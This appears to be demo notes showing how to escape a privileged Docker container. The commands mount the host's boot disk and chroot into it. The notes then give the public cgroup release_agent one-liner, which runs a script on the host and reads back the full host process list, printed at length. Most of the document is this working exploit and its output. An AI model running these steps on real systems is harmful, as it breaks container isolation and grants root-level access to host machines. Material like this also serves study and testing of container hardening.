#### Let's start a privileged container
```
$ docker run -it --privileged xxradar/hackon
```
#### Let's check we are privileged container

You can check if you're in a privileged container
```
ls /dev
```
or 
```
fdisk -l
```
or 
```
ip -a
```
#### Mount the boot disk
```
mount /dev/xvda1 /mnt
```
#### Check this out ...
```
root@8d79950f837e:/mnt/etc# cat /etc/hostname
8d79950f837e
root@8d79950f837e:/mnt/etc# cat /mnt/etc/hostname
ip-10-1-1-52
root@8d79950f837e:/mnt/etc#
```
#### We now run things on the host file system ...
```
chroot /mnt
```

#### Exploit publicaly available
```
docker run -it --privileged xxradar/hackon
```
```
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;printf '#!/bin/sh\nps >'"$t/o" >/c;
chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
    PID TTY          TIME CMD
      1 ?        00:48:33 systemd
      2 ?        00:00:00 kthreadd
      3 ?        00:00:00 rcu_gp
      4 ?        00:00:00 rcu_par_gp
      6 ?        00:00:00 kworker/0:0H-events_highpri
      9 ?        00:00:00 mm_percpu_wq
     10 ?        00:00:00 rcu_tasks_rude_
     11 ?        00:00:00 rcu_tasks_trace
     12 ?        00:25:13 ksoftirqd/0
     13 ?        00:10:12 rcu_sched
     14 ?        00:01:28 migration/0
     15 ?        00:00:00 idle_inject/0
     16 ?        00:00:00 cpuhp/0
     17 ?        00:00:00 kdevtmpfs
     18 ?        00:00:00 netns
     19 ?        00:00:00 inet_frag_wq
     20 ?        00:00:00 kauditd
     21 ?        00:00:12 khungtaskd
     22 ?        00:00:00 oom_reaper
     23 ?        00:00:00 writeback
     24 ?        00:07:37 kcompactd0
     25 ?        00:00:00 ksmd
     26 ?        00:00:20 khugepaged
     72 ?        00:00:00 kintegrityd
     73 ?        00:00:00 kblockd
     74 ?        00:00:00 blkcg_punt_bio
     75 ?        00:00:00 tpm_dev_wq
     76 ?        00:00:00 ata_sff
     77 ?        00:00:00 md
     78 ?        00:00:00 edac-poller
     79 ?        00:00:00 devfreq_wq
     80 ?        00:00:00 watchdogd
     82 ?        00:00:30 kworker/0:1H-kblockd
     84 ?        00:00:48 kswapd0
     85 ?        00:00:00 ecryptfs-kthrea
     87 ?        00:00:00 kthrotld
     88 ?        00:00:00 acpi_thermal_pm
     89 ?        00:00:00 xenbus
     90 ?        00:00:00 xenwatch
     91 ?        00:00:00 nvme-wq
     92 ?        00:00:00 nvme-reset-wq
     93 ?        00:00:00 nvme-delete-wq
     94 ?        00:00:00 scsi_eh_0
     95 ?        00:00:00 scsi_tmf_0
     96 ?        00:00:00 scsi_eh_1
     97 ?        00:00:00 scsi_tmf_1
     99 ?        00:00:00 vfio-irqfd-clea
    100 ?        00:00:00 ipv6_addrconf
    109 ?        00:00:00 kstrp
    112 ?        00:00:00 zswap-shrink
    113 ?        00:00:00 kworker/u31:0
    118 ?        00:00:00 charger_manager
    119 ?        00:00:36 jbd2/xvda1-8
    120 ?        00:00:00 ext4-rsv-conver
    203 ?        00:00:00 cryptd
    259 ?        00:00:00 kaluad
    260 ?        00:00:00 kmpath_rdacd
    261 ?        00:00:00 kmpathd
    262 ?        00:00:00 kmpath_handlerd
    263 ?        00:17:27 multipathd
    273 ?        00:00:00 loop1
    424 ?        00:00:00 acpid
    432 ?        00:00:20 cron
    445 ?        00:00:00 networkd-dispat
    451 ?        00:00:17 systemd-logind
    456 ?        01:21:53 containerd
    542 ?        00:00:00 unattended-upgr
    575 ?        00:23:19 dockerd
    627 ?        00:01:53 sshd
    655 ?        00:00:00 bpfilter_umh
   3967 ?        00:00:00 gpg-agent
  14596 ?        00:00:00 xfsalloc
  14597 ?        00:00:00 xfs_mru_cache
  61943 ?        00:05:02 accounts-daemon
 389789 ?        00:00:00 loop12
 403282 ?        00:01:39 systemd-journal
 404352 ?        00:00:07 systemd-udevd
 445014 ?        00:00:00 loop3
 511934 ?        00:00:00 fmon
 511935 ?        00:00:00 scanunit
 639612 ?        13:20:31 fctsched
1233694 ?        00:00:00 loop9
1514613 ?        00:00:00 loop11
1514907 ?        00:02:33 amazon-ssm-agen
1515006 ?        00:01:48 ssm-agent-worke
1576021 ?        00:00:00 loop2
1899836 ?        00:00:00 loop4
2462539 ?        00:00:00 loop0
2462598 ?        00:00:02 snapd
2584183 ?        00:00:03 containerd-shim
2584204 ?        00:00:00 nginx
2592576 ?        00:00:00 sshd
2662138 ?        00:00:00 loop5
2683367 ?        00:00:00 sshd
2749695 ?        00:00:00 kworker/0:0-events
2795496 ?        00:00:00 kworker/u30:1-ext4-rsv-conversion
2798137 ?        00:00:00 kworker/0:2-events
2798148 ?        00:00:00 kworker/u30:3-netns
2804865 ?        00:00:00 kworker/0:1-inet_frag_wq
2805743 ?        00:00:00 kworker/u30:0-events_unbound
2805744 ?        00:00:00 kworker/u30:2-ext4-rsv-conversion
2805746 ?        00:00:00 kworker/u30:4
2806084 ?        00:00:00 containerd-shim
2806448 ?        00:00:00 c
2806450 ?        00:00:00 ps
3139386 ?        00:00:00 polkitd
3404358 ?        00:00:00 loop6
3587899 ?        00:00:00 loop8
root@945bd992020b:/#
```
